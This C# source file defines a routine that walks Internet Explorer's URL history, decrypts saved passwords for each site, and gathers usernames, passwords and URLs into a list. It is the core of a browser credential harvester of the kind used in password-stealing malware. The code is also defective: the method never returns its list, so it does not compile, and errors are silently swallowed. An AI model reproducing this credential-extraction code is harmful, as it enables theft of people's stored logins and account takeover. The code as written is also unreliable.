using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BrowserTools
{
    public static class InternetExplorer
    {
        public static List<LoginData> GetLoginData()
        {
            var loginData = new List<LoginData>();

            try
            {
                using(ExplorerUrlHistory history = new ExplorerUrlHistory())
                {
                    var dataList = new List<string[]>();

                    foreach(STATURL item in history)
                    {
                        try
                        {
                            if(DecryptIePassword(item.UrlString, dataList))
                            {
                                foreach(var loginInfo in dataList)
                                {
                                    loginData.Add(new LoginData
                                    {
                                        Username = loginInfo[0],
                                        Password = loginInfo[1],

                                        Url = item.UrlString,

                                        Browser = BrowserName.InternetExplorer
                                    });
                                }
                            }
                        } catch (Exception)
                        {
                            // Add ex
                        }
                    }
                }
            } catch (Exception)
            {
                // Add ex
            }
        }
    }
}
